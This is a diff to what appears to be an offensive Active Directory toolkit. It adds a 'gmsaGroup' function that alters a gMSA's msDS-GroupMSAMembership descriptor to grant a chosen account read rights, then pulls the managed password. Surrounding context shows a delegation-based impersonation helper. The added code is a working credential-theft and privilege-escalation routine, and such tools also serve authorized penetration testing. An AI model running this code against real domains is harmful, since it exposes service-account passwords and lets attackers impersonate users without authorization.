@@ -458,6 +458,41 @@ async def groupMember(conn: ConnectionHandler, group: str, member: str):
     LOG.info(f"{member} added to {group}")
 
 
+async def gmsaGroup(conn: ConnectionHandler, gmsa: str, member: str):
+    """
+    Add a new member (user, group, computer) to msDS-GroupMSAMembership of a gMSA so it can retrieve its password
+
+    :param gmsa: sAMAccountName, DN or SID of the gMSA
+    :param member: sAMAccountName, DN or SID of the new member
+    """
+    ldap = await conn.getLdap()
+    new_sd, _ = await utils.getSD(
+        conn, gmsa, "msDS-GroupMSAMembership", 0
+    )
+    if "s-1-" in member.lower():
+        member_sid = member
+    else:
+        async for e in ldap.bloodysearch(member, attr=["objectSid"]):
+            member_sid = e["objectSid"]
+            break
+    access_mask = (
+        accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_READ_PROP"]
+        | accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
+    )
+    utils.addRight(new_sd, member_sid, access_mask)
+
+    await ldap.bloodymodify(
+        gmsa,
+        {"msDS-GroupMSAMembership": [(Change.REPLACE.value, new_sd.getData())]},
+    )
+
+    LOG.info(f"{member} can now retrieve the password of {gmsa}")
+    async for entry in ldap.bloodysearch(
+        gmsa, attr=["msDS-ManagedPassword"]
+    ):
+        yield entry
+
+
 async def rbcd(conn: ConnectionHandler, target: str, service: str):
     """
     Add Resource Based Constraint Delegation for service on target, used to impersonate a user on target with service (Requires "Write" permission on target's msDS-AllowedToActOnBehalfOfOtherIdentity and Windows Server >= 2012)
